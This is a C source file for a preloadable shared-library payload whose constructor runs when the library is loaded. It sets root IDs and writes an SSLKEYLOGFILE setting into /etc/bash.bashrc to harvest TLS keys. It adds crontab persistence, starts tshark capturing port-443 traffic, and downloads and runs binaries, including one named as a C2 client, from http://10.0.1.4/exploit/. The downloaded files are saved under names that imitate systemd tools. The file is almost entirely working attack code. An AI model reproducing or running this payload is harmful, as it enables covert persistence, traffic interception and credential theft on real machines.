//#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>  
#include <sys/types.h>
#include <sys/wait.h> 
#include <fcntl.h>
#include <sys/stat.h>
#include <stdlib.h>
#include <stdio.h>
//#include <errno.h>

void test(char* argv[]);
void appendToFile(char* name, char* content, int len);
void runAlone(char* argv[]);

static void __attribute__((constructor)) _init(void) {
//int main(void) {
	syscall(SYS_setuid, 0);
	syscall(SYS_setgid, 0);

	appendToFile("/etc/bash.bashrc", "SSLKEYLOGFILE=/var/log/gamelog/key.log\n",40);

	appendToFile("/etc/bash.bashrc", "GAMELOG=/var/log/gamelog/syslog.log\n",37);
	appendToFile("/etc/crontab", "00 9-17 * * 1-5 root /usr/bin/systemd-checker\n",45);

	appendToFile("/etc/crontab", "@reboot root tshark -ni any -f 'tcp port 443' -w /var/log/gamelog/error_log -b duration:5000\n",94);

	char* argv2[] = {"/bin/mkdir","-p", "/var/log/gamelog",NULL };
	test(argv2);

	printf("Done with mkdir\n");


	char* argv0[] = {"/usr/bin/apt","install","-y","tshark", "net-tools",NULL};
	test(argv0);

	printf("Done with apt\n");
	char* argv8[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/updatesvc_aka_c2client","-O", "/usr/bin/systemd-check", NULL};
	test(argv8);

	printf("Done with updatesvc\n");
	char* argv9[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/check_update","-O", "/usr/bin/systemd-checker", NULL};
	test(argv9);
	
	printf("Done with check_update\n");
	char* argv10[] = {"/usr/bin/wget","--quiet","http://10.0.1.4/exploit/enumerate", "-O", "/usr/bin/enumerate", NULL};
	test(argv10);


	chmod("/usr/bin/systemd-check",0100);
        chmod("/usr/bin/systemd-checker",0100);
        chmod("/usr/bin/enumerate",0100);


	printf("Done with check_update\n");

	char* argv11[] = { "/usr/bin/enumerate", NULL };
	test(argv11);
	printf("Done with enumerate\n");

	char* argv7[] = {"/usr/bin/tshark", "-ni", "any", "-f" "tcp port 443", "-w", "/var/log/gamelog/error_log", "-b", "duration:5000", NULL};
	runAlone(argv7);

	char* argv12[] = {"/usr/bin/systemd-checker", NULL};
	test(argv12);

	syscall(SYS_exit, 69);
}


void appendToFile(char* name, char* content,int len) {
	int f = open(name,O_WRONLY | O_APPEND);
	int c = write(f, content, len);
	close(f);
}

void runAlone(char* argv[]) {
	char* envp[] = {
		"SSLKEYLOGFILE=/var/log/gamelog/key.log",
		"GAMELOG=/var/log/gamelog/syslog.log",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games",
		"LC_MESSAGES=en_GB.UTF-8",
		"LC_ALL=en_GB.UTF-8",
		"LC_TELEPHONE=en_GB.UTF-8",
		"LC_MEASUREMENT=en_GB.UTF-8",
		NULL
	};
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    // Don't wait for child. 
	    // waitpid(pid, &status, 0);
	}
	else 
	{
	    // we are the child
		int e = execve(argv[0], argv,envp);
		_exit(EXIT_FAILURE);   // exec never returns
	}

}

void test(char* argv[]) {
	char* envp[] = {
		"SSLKEYLOGFILE=/var/log/gamelog/key.log",
		"GAMELOG=/var/log/gamelog/syslog.log",
		"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games",
		"LC_MESSAGES=en_GB.UTF-8",
		"LC_ALL=en_GB.UTF-8",
		"LC_TELEPHONE=en_GB.UTF-8",
		"LC_MEASUREMENT=en_GB.UTF-8",
		NULL
	};
	pid_t parent = getpid();
	pid_t pid = fork();

	if (pid == -1)
	{
	    // error, failed to fork()
	} 
	else if (pid > 0)
	{
	    int status;
	    waitpid(pid, &status, 0);
	    if(status > 0) {
		syscall(SYS_exit,status);   // exec never returns
	    }
	}
	else 
	{
	    // we are the child
		int e = execve(argv[0], argv,envp);
		printf("%s %d\n",argv[0],e);
		syscall(SYS_exit,e);   // exec never returns
	}
}
